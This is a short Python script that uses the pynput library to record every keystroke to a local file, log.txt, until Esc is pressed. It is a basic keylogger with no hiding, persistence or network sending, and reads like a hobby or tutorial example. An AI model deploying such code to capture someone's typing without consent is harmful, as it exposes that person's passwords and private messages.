import pynput

from pynput.keyboard import Key, Listener

words = []


def on_press(key):
    global words, count
    words.append(key)
    write_file(words=words)
    words = []

def on_release(key):
    if key == Key.esc:
        return False


def write_file(words):
    with open('log.txt', 'a', encoding='UTF-8') as file:
        for word in words:
            word_formatted = str(word).replace("'", "")
            if word_formatted.find('space') == 4:
                file.write(' ')
            elif word_formatted.find('enter') == 4:
                file.write('\n')
            elif word_formatted.find('Key') == 0:
                file.write('')
            elif word_formatted.find('Key') == -1:
                file.write(word_formatted)


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()





